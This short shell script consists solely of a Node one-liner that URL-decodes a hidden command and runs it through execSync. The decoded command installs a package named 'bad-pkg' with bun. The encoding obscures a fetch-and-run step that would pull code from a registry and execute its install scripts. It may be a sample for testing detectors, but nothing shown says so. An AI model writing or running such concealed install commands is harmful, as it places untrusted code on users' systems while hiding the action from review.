#!/bin/sh
node -e 'require("child_process").execSync(unescape("bun%20install%20bad-pkg"))'
